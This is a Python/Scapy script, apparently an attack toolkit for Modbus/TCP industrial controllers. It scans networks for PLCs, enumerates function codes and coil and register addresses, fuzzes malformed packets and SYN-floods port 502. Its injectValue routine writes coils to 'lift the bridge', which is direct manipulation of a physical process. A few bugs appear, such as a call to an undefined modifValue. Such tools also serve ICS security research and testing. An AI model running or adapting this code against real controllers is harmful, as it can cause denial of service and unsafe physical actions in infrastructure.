#!/usr/bin/env python
# -*- coding: utf-8 -*-

# import logging
# logging.getLogger("scapy").setLevel(1)

import sys
import argparse


sys.path.append('/home/user/projects/tools/scapy')
from scapy.all import *
from modbus import *

from netaddr import *

# import sys
# try:
#    user_input = input()
# except KeyboardInterrupt:
#    sys.exit(0)

modport = 502
iface = "eth1"
verbose = False
transId = 1


def sniffModbus():
	global iface
	sniff(prn=replyPacket, iface=iface, filter="port 502", count=10)

def replyPacket(pkt):
	print pkt.summary()

"""
Open a new Streamsocket
"""
def connectMb(ipDest):
	s = socket.socket()
	s.connect((ipDest, modport)) 
	c = StreamSocket(s, Raw)
	return c

"""
Close opened socket
"""
def closeMb(c):
	c.close()

"""
Generates an unique transaction ID
"""
def getTransId():
	global transId
	transId = transId + 1
	if transId > 65535:
		transId = 1
	return transId

"""
Scan IP range to detect IP who respond on modbusport
"""
def scanNetwork(ipRange, timeout):
	global verbose, modport
		
	ipResponding = []
			
	if verbose:
		print "Starting Scan..."

	for ip in IPNetwork(ipRange):
		try:
			# socket object instantiation
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			# set socket timeout, value from cmd is in mills
			s.settimeout(float(timeout) / float(1000))			

			# connect requires ip addresses in string format so it must be cast
			s.connect((str(ip), modport))
			if verbose:
				print "- " + str(ip) + " is alive"		
			ipResponding.append(str(ip))

		except socket.error:
			if verbose:
				print "- " + str(ip) + " is not alive"		
	
		s.close()
		
	return ipResponding

"""
Scan a device for Modbus codes defined
"""
def scanModbusCodes(ip, timeout, notIntrusive=True):
	global verbose

	knownFunctions = [1, 2, 3, 4, 5, 6, 7, 15, 16, 17, 43]	
	writingFunctions = [5, 6, 15, 16, 21]	
	codesDefined = []
	coilsDefined = []
	discretInputDefined = []
	inputRegisterDefined = []
	holdingRegisterDefined = []

	# Address range
	MINADDR = 0
	MAXADDR = 256  # Default : 256

	# Function codes range
	MINCODE = 1  # 0 is illegal
	MAXCODE = 45  # Upper than 127 are exception codes

	for code in range(MINCODE, MAXCODE):
		if notIntrusive and code in writingFunctions:
				if verbose:
					print "Not testing the writing function : " + str(code)
				continue
				
		# Open connection
		c = connectMb(ip)
		
		if code == 1:
			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU01_Read_Coils_Request()		
		elif code == 2:
			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU02_Read_Discrete_Inputs_Request()		
		elif code == 3:
			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU03_Read_Holding_Registers_Request()		
		elif code == 4:
			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU04_Read_Input_Registers_Request()		
		elif code == 5:
			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU05_Write_Single_Coil_Request()		
		elif code == 6:
			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU06_Write_Single_Register_Request()		
		elif code == 7:
			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU07_Read_Exception_Status_Request()		
		elif code == 15:
			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU0F_Write_Multiple_Coils_Request()		
		elif code == 16:
			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU10_Write_Multiple_Registers_Request()		
		elif code == 17:
			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU11_Report_Slave_Id_Request()		
		elif code == 43:
			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU2B_Read_Device_Identification_Request()		
		else:
			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU00_Generic_Request(funcCode=code)
			#  Considering the packet forged, we try to put good values and length with the codes known and remove extra payload
			pkt = ModbusADU_Request(str(pkt))
		
		try:			
			ans = c.sr1(pkt, timeout=1000, verbose=verbose)
			ansADU = ModbusADU_Response(str(ans))

			if pkt.funcCode == ansADU.funcCode:
				if verbose:
					print "Code " + str(pkt.funcCode) + " defined"
				codesDefined.append(ansADU.funcCode)
			else:
				if verbose:
					print "Code " + str(pkt.funcCode) + " not defined (" + str(ansADU.funcCode) + ")" + " received, Exception : " + str(ansADU.exceptCode)
		except:
			if verbose:
				print "Something bad with " + str(pkt.funcCode)

		c.close()
		
	# Check for function known
	c = connectMb(ip)

	# Coils		
	if 1 in codesDefined:	
		for addr in range(MINADDR, MAXADDR):
			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU01_Read_Coils_Request(startAddr=addr, quantity=1)
			
			ans = c.sr1(pkt, verbose=verbose)
			ansADU = ModbusADU_Response(str(ans))
			if pkt.funcCode == ansADU.funcCode:
				if verbose:
						print "Addr " + str(addr) + " defined"
				coilsDefined.append(addr)
			else:
				if verbose:
					print "Addr " + str(addr) + " not defined (" + str(ansADU.funcCode) + ")" + " received, Exception : " + str(ansADU.exceptCode)
				break

	# Discrete input
	if 2 in codesDefined:	
		for addr in range(MINADDR, MAXADDR):
			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU02_Read_Discrete_Inputs_Request(startAddr=addr, quantity=1)
			
			ans = c.sr1(pkt, verbose=verbose)
			ansADU = ModbusADU_Response(str(ans))
			if pkt.funcCode == ansADU.funcCode:
				if verbose:
					print "Addr " + str(addr) + " defined"
				discretInputDefined.append(addr)
			else:
				if verbose:
					print "Addr " + str(addr) + " not defined (" + str(ansADU.funcCode) + ")" + " received, Exception : " + str(ansADU.exceptCode)
				break		

	# Input register
	if 4 in codesDefined:	
		for addr in range(MINADDR, MAXADDR):
			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU04_Read_Input_Registers_Request(startAddr=addr, quantity=1)
			
			ans = c.sr1(pkt, verbose=verbose)
			ansADU = ModbusADU_Response(str(ans))
			if pkt.funcCode == ansADU.funcCode:
				if verbose:
					print "Addr " + str(addr) + " defined"
				inputRegisterDefined.append(addr)
			else:
				if verbose:
					print "Addr " + str(addr) + " not defined (" + str(ansADU.funcCode) + ")" + " received, Exception : " + str(ansADU.exceptCode)
				break

	# Holding registers
	if 3 in codesDefined:	
		for addr in range(MINADDR, MAXADDR):
			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU03_Read_Holding_Registers_Request(startAddr=addr, quantity=1)
			
			ans = c.sr1(pkt, verbose=verbose)
			ansADU = ModbusADU_Response(str(ans))
			if pkt.funcCode == ansADU.funcCode:
				if verbose:
					print "Addr " + str(addr) + " defined"
				holdingRegisterDefined.append(addr)
			else:
				if verbose:
					print "Addr " + str(addr) + " not defined (" + str(ansADU.funcCode) + ")" + " received, Exception : " + str(ansADU.exceptCode)
			break

	c.close()
	
	return codesDefined, coilsDefined, discretInputDefined, inputRegisterDefined, holdingRegisterDefined

"""
Read Device diagnostic
"""
def scanDeviceDiagnostic(ip):
	global verbose

	objects = {}
	# Open connection
	c = connectMb(ip)

	MINOBJECTID = 1
	MAXOBJECTID = 256

	for id in range(MINOBJECTID, MAXOBJECTID):
		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU2B_Read_Device_Identification_Request(readCode=4, objectId=id)
		ans = c.sr1(pkt, verbose=verbose)
		ans = ModbusADU_Response(str(ans))

		if ans.funcCode == 0x2B:
			if ans[ModbusPDU2B_Read_Device_Identification_Response].objCount == 1:			
				objects[id] = ans[ModBusPDU_ObjectId].value	

	# Close connection
	c.close()
	return objects

"""
Example of writing in coils
   Here, we make lift the bride
"""
def injectValue(ip):

	# Open connection
	c = connectMb(ip)
	
	# Get the bridge to raise
	myPayload = ModbusADU_Request(transId=getTransId()) / ModbusPDU05_Write_Single_Coil_Request(outputAddr=0x0000, outputValue=0xFF00)
	ansBrut = c.sr1(myPayload)
	
	myPayload = ModbusADU_Request(transId=getTransId()) / ModbusPDU05_Write_Single_Coil_Request(outputAddr=0x0001, outputValue=0xFF00)
	ansBrut = c.sr1(myPayload)

	myPayload = ModbusADU_Request(transId=getTransId()) / ModbusPDU05_Write_Single_Coil_Request(outputAddr=0x0002, outputValue=0xFF00)
	ansBrut = c.sr1(myPayload)

	# close connection
	c.close()

"""
TCP SYN Flood
"""
def SYN_flood(ipRange, timeout):
	global verbose, modport
	
	if verbose:
		print "SYN Flooding..."

	for ip in IPNetwork(ipRange):
		if verbose:
			print "Targetting " + str(ip)
		p = IP(dst=str(ip), id=1111, ttl=99) / TCP(sport=RandNum(1025, 65535), dport=modport, seq=12345, ack=1000, window=1000, flags="S") / "SYN Flooding"
		srloop(p, inter=0.3, retry=2, timeout=timeout)


"""
Test malformated packet
"""
def MBfuzzing(ip, test, quantity=50):
	global verbose	
		
	# Fuzzing test for reading
	for i in range (1, quantity):
		# Open connection
		c = connectMb(ip)
		
		# Revu all possible tests
		
		# Fuzz read_coils_request		
		pkt = None
		if test == 1:
			ADU = ModbusADU_Request(transId=getTransId())
			pkt = ADU / fuzz(ModbusPDU01_Read_Coils_Request(funcCode=1))
		# Fuzz write_single_coils_request		
		elif test == 2:
			ADU = ModbusADU_Request(transId=getTransId())
			pkt = ADU / fuzz(ModbusPDU05_Write_Single_Coil_Request(funcCode=5))
		# Test ADU transId = 0
		elif test == 3:
			pkt = ModbusADU_Request(transId=0, protoId=0, unitId=0) / ModbusPDU01_Read_Coils_Request()
		# Fuzz on ADU proto Id, unitId
		elif test == 4:
			pkt = fuzz(ModbusADU_Request(transId=getTransId())) / ModbusPDU01_Read_Coils_Request()
			
		if pkt is None:
			print "No test asked"
			return
		
		print pkt.summary()	
		
		ans = c.sr1(pkt, verbose=verbose)
		if ans is not None:
			ans = ModbusADU_Response(str(ans))
			print ans.summary()
		
		c.close()

"""
Test of reassembling Device identification packets
"""
def fragIdentif(ip):
	# Open connection
	c = connectMb(ip)
	more = 255
	objectId = 0
	while more == 255:
		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU2B_Read_Device_Identification_Request(readCode=3, objectId=objectId)
		ans = c.sr1(pkt, verbose=verbose)
		ans = ModbusADU_Response(str(ans))

		if ans.funcCode == 0x2B:
			print "Objects in msg : " + str(ans[ModbusPDU2B_Read_Device_Identification_Response].objCount)

			more = ans[ModbusPDU2B_Read_Device_Identification_Response].more
			objectId = ans[ModbusPDU2B_Read_Device_Identification_Response].nextObjId
		else:
			more = 0	
	
	c.close()

if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("-m", "--mode", help="Mode of use")
	parser.add_argument("-t", "--target", help="IP range", default="127.0.0.1")	
	parser.add_argument("-x", "--timeout", help="Timeout in ms of connection", default=100)	
	parser.add_argument("-v", "--verbose", help="increase output verbosity", action="store_true")
	parser.add_argument("-c", "--notIntrusive", help="Make modification on PLC (use of Write functions)", action="store_true")
	parser.add_argument("-r", "--register", help="Register Id")	
	args = parser.parse_args()

	if args.verbose:	
		verbose = args.verbose

	if args.mode == "scanNetwork":
		for ip in scanNetwork(args.target, args.timeout):
			print ip
	elif args.mode == "scanModbusCodes":
		codesDefined, coilsDefined, discretInputDefined, inputRegisterDefined, holdingRegisterDefined = scanModbusCodes(args.target, args.timeout, args.notIntrusive)
		print "function codes        : " + str(codesDefined)
		if args.notIntrusive:
			print "Functions modifying values on PLC have been ignored"		
		print "Coils Addr            : " + str(coilsDefined)
		print "Discret Input Addr    : " + str(discretInputDefined)
		print "Register Input Addr   : " + str(inputRegisterDefined)
		print "Holding Register Addr : " + str(holdingRegisterDefined)
	elif args.mode == "scanDeviceDiagnostic":
		diags = scanDeviceDiagnostic(args.target)
		for id, obj in diags.iteritems():
			print "[" + str(id) + "] " + str(obj)
	elif args.mode == "injectValue":
		modifValue(args.target)
	elif args.mode == "SYN_flood":
		SYN_flood(args.target, args.timeout)
	elif args.mode == "fuzz":
		MBfuzzing(args.target, 3)
	elif args.mode == "interact":
		interact(mydict=globals())
	elif args.mode == "readtest":
		c = connectMb(args.target)
		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU04_Read_Input_Registers_Request(quantity=2)
		pkt.show()
		ans = c.sr1(pkt, verbose=verbose)
		if ans is not None:
			ans = ModbusADU_Response(str(ans))
			ans.show()
		c.close()
	elif args.mode == "fragIdentif":
		fragIdentif(args.target)
	else:
		parser.print_help()




